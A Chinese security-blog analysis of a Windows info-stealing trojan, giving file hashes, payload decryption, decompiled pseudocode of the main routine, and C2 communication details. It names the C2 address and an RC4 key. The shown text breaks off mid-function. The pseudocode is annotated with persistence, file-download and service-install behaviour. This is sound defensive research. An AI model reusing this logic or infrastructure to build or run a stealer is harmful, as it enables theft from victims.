---
title: 某窃密木马分析
url: https://www.secpulse.com/archives/190788.html
source: 安全脉搏
date: 2022-11-10
fetch_date: 2025-10-03T22:12:42.473126
---

# 某窃密木马分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 某窃密木马分析

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[ChaMd5安全团队](https://www.secpulse.com/newpage/author?author_id=3747)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-09

17,663

## IOC

```
MD5 2c6ff180f035fc4b84557a3d1c7a1df2
SHA-1 5721810e9e28f6236bca252b92b7b25c47fb5409
SHA-256 50ee17c3836a1d9daa734b394f5cfc5eeade5656d472bc3ac7538e4eb687bdb6
File type Win32 EXE
Magic PE32 executable for MS Windows (GUI) Intel 80386 32-bit
Creation Time 2022-03-09 01:33:19 UTC
```

该样本在首次出现在VT上的时间为今年三月份，是一个窃密木马，样本来源不方便透露。

## 静态分析&动态调试

### 解密恶意代码

在代码0x40AA70处开始解密数据段中0x412154地址处的数据，该隐藏的数据为恶意代码模块。![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190788-1667976429.png)

### 分析思路

在ida中初步静态分析，发现代码功能被分散在不同的异常处理中。该样本伪装成一个MFC框架开发的前台程序，但是实则对话框是不显示的，后台运行，所有图片等资源都是用于伪装。![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190788-1667976432.png)在procmon中观察到其存在网络活动，但是导入表中没有导入任何网络库及网络函数，猜测要么是动态加载，甚至可能存在加密代码。我觉得这是一个可以快速定位恶意代码位置的切入点，于是动态调试并对LoadLibrary函数下断点。成功发现ws2\_32库的加载，以及socket函数的的导入。在socket函数调用处断下，再由此返回到用户领空，成功来到恶意代码段，发现该代码段是一个新的基址，证明恶意代码是被加密存储在样本中。根据栈的记录来到该模块的调用顶层，也就是fuckyou函数。接下来，沿着fuckyou函数往下分析。

```
char fuckyou()
{
  DWORD v0; // eax
  void *v1; // esi
  char result; // al
  void *v3; // esi
  void *v4; // esi
  CHAR String; // [esp+Ch] [ebp-7B0h]
  char v6; // [esp+Dh] [ebp-7AFh]
  __int16 v7; // [esp+409h] [ebp-3B3h]
  char v8; // [esp+40Bh] [ebp-3B1h]
  CHAR Filename; // [esp+40Ch] [ebp-3B0h]
  struct _OSVERSIONINFOA VersionInformation; // [esp+510h] [ebp-2ACh]
  CHAR Source; // [esp+5A4h] [ebp-218h]
  char v12; // [esp+5F3h] [ebp-1C9h]
  CHAR Dst; // [esp+5F4h] [ebp-1C8h]
  struct tagMSG Msg; // [esp+6F8h] [ebp-C4h]
  struct _OSVERSIONINFOA v15; // [esp+714h] [ebp-A8h]
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+7A8h] [ebp-14h]
  int v17; // [esp+7B0h] [ebp-Ch]
  int v18; // [esp+7B4h] [ebp-8h]
  CHAR Format; // [esp+7B8h] [ebp-4h]
  char v20; // [esp+7B9h] [ebp-3h]
  char v21; // [esp+7BAh] [ebp-2h]

  GetInputState();
  v0 = GetCurrentThreadId();
  PostThreadMessageA(v0, 0, 0, 0);
  GetMessageA(&Msg, 0, 0, 0);
  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);
  if ( &unk_64AFEE )                            // 根据配置文件设置判断是否启用功能
    sub_646B8B(0, 0, (int)sub_6457A7, (int)&unk_64AFEE, 0, 0);// 从网络上下载文件并保存到C盘中
  if ( dword_64AFE8 )
    sub_645414();                               // 若进程列表中存在“rundll32.exe”进程则杀死
  if ( !byte_64AFD8 )
  {
    String = 0;
    memset(&v6, 0, 0x3FCu);
    v7 = 0;
    v8 = 0;
    Format = 37;
    v20 = 115;
    v21 = 0;
    sprintf(ServiceName, &Format, ServiceName);
    ServiceStartTable.lpServiceName = (LPSTR)1852731203;
    ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)'Gtce';
    v17 = 'puor';
    LOBYTE(v18) = 0;
    sub_64467B((int)ServiceName, (int)&ServiceStartTable, &String, 0x400u);
    if ( !lstrlenA(&String) )
    {
      sub_642EA4((int)ServiceName, aDefault);
      sub_64546B((int)ServiceName);
    }
    v4 = (void *)sub_646B8B(0, 0, (int)sub_645A0F, 0, 0, 0);
    WaitForSingleObject(v4, 0xFFFFFFFF);
    CloseHandle(v4);
    while ( 1 )
      Sleep(0xF4240u);
  }
  v15.dwOSVersionInfoSize = 156;
  GetVersionExA(&v15);
  sub_64505B(&v15.dwMajorVersion, &v15.dwMinorVersion, &v15.dwBuildNumber);
  if ( v15.dwMajorVersion == 10 && !v15.dwMinorVersion )
  {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);// 注册表设置开机自启动
    v1 = (void *)sub_646B8B(0, 0, (int)sub_645A0F, 0, 0, 0);
    WaitForSingleObject(v1, 0xFFFFFFFF);
    CloseHandle(v1);
    while ( 1 )
      Sleep(0xF4240u);
  }
  result = byte_64AFD8;
  if ( byte_64AFD8 == 2 )
  {
    if ( sub_646AB6() )
    {
      ServiceStartTable.lpServiceName = ServiceName;
      ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_645E8B;
      v17 = 0;
      v18 = 0;
      Sleep(0x1F4u);
      StartServiceCtrlDispatcherA(&ServiceStartTable);
      Sleep(0x3E8u);
      StartServiceCtrlDispatcherA(&ServiceStartTable);
    }
    else
    {                                           // 备份样本，取名'Ejdbnls.exe'，设置受保护属性隐藏该文件
      ExpandEnvironmentStringsA(Src, &Dst, 0x104u);
      Format = 37;
      v20 = 115;
      v21 = 0;
      wsprintfA(&Source, &Format, aEjdbnlsExe);
      if ( *(&v12 + strlen(&Dst)) == 92 )
        *(&v12 + strlen(&Dst)) = 0;
      strcat(&Dst, ::Source);
      strcat(&Dst, &Source);
      GetModuleFileNameA(0, &Filename, 0xE1u);
      CopyFileA(&Filename, &Dst, 0);
      sub_646726(ServiceName, DisplayName, aYouoswAyeqekmc);// 注册作为服务
      sub_642EA4((int)ServiceName, aDefault);
      sub_64546B((int)ServiceName);
      Sleep(0x1F4u);
    }
    sub_645CC7();                               // 连接C2服务器以及访问控制
    ExitProcess(0);
  }
  if ( byte_64AFD8 == 1 )
  {
    sub_642EA4((int)ServiceName, aDefault);
    sub_64546B((int)ServiceName);
    sub_646F4A(aRavmondExe);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_6461C2, 0, 0, 0);
    v3 = (void *)sub_646B8B(0, 0, (int)sub_645A0F, 0, 0, 0);
    WaitForSingleObject(v3, 0xFFFFFFFF);
    CloseHandle(v3);
    while ( 1 )
      Sleep(0xF4240u);
  }
  return result;
}
```

### 主动与C2连接

在sub\_645CC7函数中，该样本开始与C2服务器进行交互。一路分析到函数sub\_645A0F，该函数首先根据固定密钥初始化密钥空间，然后与154.91.159.105:8000建立连接，之后启动一根线程处理接受到的数据包。数据包处理例程为函数sub\_641D5F。![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190788-1667976434.png)

在函数sub\_645A0F中设置目标IP和端口（固定IP和固定端口）。![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190788-1667976436.png)该样本的网络数据收发需要经过三轮加密解密，初始化的密钥空间服务于第二轮加密，为RC4加密算法，密钥为"EwinhProtocolHosty"。

第一轮加密算法异或1如下：

```
int __stdcall sub_641A38(int a1, unsigned int a2)
{
  v12 = 0;
  v2 = 0;
  v...